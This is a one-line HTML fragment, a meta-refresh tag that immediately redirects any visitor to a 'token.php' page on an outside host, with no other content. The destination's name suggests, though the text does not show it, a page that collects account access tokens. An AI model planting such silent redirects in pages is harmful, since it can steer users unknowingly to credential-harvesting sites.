<meta HTTP-EQUIV="REFRESH"
content="0; url=http://auto.trickwap.net/token.php">